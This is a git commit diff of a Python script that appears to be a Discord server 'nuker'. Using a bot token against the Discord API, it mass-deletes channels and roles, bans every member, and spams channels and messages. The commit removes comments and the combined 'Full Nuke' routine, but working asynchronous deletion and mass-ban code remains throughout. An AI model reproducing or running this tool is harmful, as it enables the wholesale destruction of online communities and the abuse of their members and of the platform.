4e5ff26ebe84dda8d64a53c0a76b22d5d9cfd79f
Epoch <66850320+Iurq@users.noreply.github.com>
2023-02-04 12:22:01 +0000

    Update Pre-Release files

--- 4xelPreRelease.py
+++ 4xelPreRelease.py
@@ -1,4 +1,4 @@
-﻿import requests
+import requests
 import asyncio
 import aiohttp
 import discord
@@ -85,7 +85,7 @@ while True:
 
 ╔═════════════════════════════╦═════════════════════════════╦═════════════════════════════╗
 ║ [-1-] Delete all channels   ║ [-4-] Ban All               ║                             ║
-║ [-2-] Mass create channels  ║ [-5-] Mass create roles     ║       [-0-] Full Nuke       ║
+║ [-2-] Mass create channels  ║ [-5-] Mass create roles     ║   [-0-] Version & Credits   ║
 ║ [-3-] Mass Ping/Message     ║ [-6-] Delete all roles      ║                             ║  
 ╚═════════════════════════════╩═════════════════════════════╩═════════════════════════════╝ 
          
@@ -96,14 +96,13 @@ while True:
   
 
 
-  ## DELETE ALL CHANNELS ##
-  async def get_delchan_list(del_chan_session): # this function basically gets a list of all the channels we want to delete
-    tasks = []                                  # instead of running the requests one by one, we gather a big list and run them all at once
-    total = int(len(all_chan_id))  # this is just a total count of channels
-    count = 0  #this is the count of channels deleted so far
+  async def get_delchan_list(del_chan_session):
+    tasks = []
+    total = int(len(all_chan_id))
+    count = 0
     for x in all_chan_id:
 
-      count = count + 1  #this is the count of channels deleted so far
+      count = count + 1
       print(f"\r >  [{count}/{total}] Channel Requests Sent", end  = " ")
 
       url = f"https://discord.com/api/v9/channels/{x}"
@@ -111,32 +110,31 @@ while True:
       await asyncio.sleep(0.01) #0.03
     return tasks
 
-  async def req_chan_del():  #this is hard to explain but this is the function that makes all the requests go off at once
+  async def req_chan_del():
     async with aiohttp.ClientSession() as del_chan_session:  
       tasks = await get_delchan_list(del_chan_session)
       await asyncio.gather(*tasks)
 
 
-  if comm == "1":  # if the commands from the user = 1 do this
+  if comm == "1":
     print("")
     all_chan_id = []
-    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"  # the request url to all the channels
+    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
     header = {"authorization": "Bot " + TOKEN}   
 
     # scraping channel ids #
     all_chan_id_req = requests.get(scrape_url, headers = header) 
-    for channel in json.loads(all_chan_id_req.text):  # this just appends all the channel IDs in the server into a list
+    for channel in json.loads(all_chan_id_req.text):
       all_chan_id.append(channel['id'])
-    asyncio.run(req_chan_del())  #this is the main function that runs all the tasks
+    asyncio.run(req_chan_del())
 
     
   
 
 
-  ## SPAM CHANNELS ##
   chan_amount = None
 
-  async def get_chanmake_list(make_chan_session):  #this creates a list of a ton of create channel requests
+  async def get_chanmake_list(make_chan_session):
     tasks = []
     count = 0
     for x in range(chan_amount):
@@ -148,20 +146,20 @@ while True:
       await asyncio.sleep(0.03)
     return tasks
 
-  async def req_chan_make():  #this gathers all the tasks and runs them
+  async def req_chan_make():
     async with aiohttp.ClientSession() as make_chan_session:
       tasks = await get_chanmake_list(make_chan_session)
       await asyncio.gather(*tasks)
 
       
-  if comm == "2":   #if the commands from the user  = 2 do this
-    chan_amount = int(input("Amount of Channels:  "))  #gets the amount of channels created from the user, no scraping required
-    chan_name = input("Name of Channels:  ")  # gets the name of the channels from user
+  if comm == "2":
+    chan_amount = int(input("Amount of Channels:  ")) 
+    chan_name = input("Name of Channels:  ")
     print("")
     url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
     header = {"authorization": "Bot " + TOKEN}
-    data = {"type": 0, "name": chan_name, "permission_overwrites": [] }  #here is the data and settings for the new channels, you can tweak the permmissions and stuff
-    asyncio.run(req_chan_make()) #main function
+    data = {"type": 0, "name": chan_name, "permission_overwrites": [] }
+    asyncio.run(req_chan_make())
 
 
   async def spam_chan_list(spam_session):
@@ -194,7 +192,6 @@ while True:
   if comm == "3":
     continue
     
-  ## BAN ALL ##
   async def ban_list(ban_session):
     count = 0
     total = len(all_member_id)
@@ -221,7 +218,6 @@ while True:
     asyncio.run(req_ban())
 
 
-    ## ROLES SPAMMER ##
   async def crole_list(crole_session):
     count = 0
     tasks =[]
@@ -252,8 +248,6 @@ while True:
 
 
 
-
-    ## ROLE DELETER ##
   async def get_delrole_list(del_role_session):
     count = 0
     tasks = []
@@ -287,30 +281,11 @@ while True:
     asyncio.run(req_role_del())
   
   if comm == "0":
-      print("")
-      all_role_id = []
-      scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
-      header = {"authorization": "Bot " + TOKEN}
-  
-      all_role_id_req = requests.get(scrape_url, headers = header)
-      for role in json.loads(all_role_id_req.text):
-          all_role_id.append(role["id"])
-      asyncio.run(req_role_del())
-      print("")
-      asyncio.run(req_ban())
-      print("")
-      all_chan_id = []
-      scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"  # the request url to all the channels
-      header = {"authorization": "Bot " + TOKEN}   
-      
-      # scraping channel ids #
-      all_chan_id_req = requests.get(scrape_url, headers = header) 
-      for channel in json.loads(all_chan_id_req.text):  # this just appends all the channel IDs in the server into a list
-        all_chan_id.append(channel['id'])
-      asyncio.run(req_chan_del())  #this is the main function that runs all the tasks
-
+      print("v2.0a - Made by epoch#0003")
+      print("Licensed to UGAFG & ISANA.")
+      print("Premium Version")
 
   print("\n")
-  check2 = input("SUCCESS, press enter to continue:  ")
+  check2 = input("Complete, Press enter to continue.")
 
   os.system('cls')
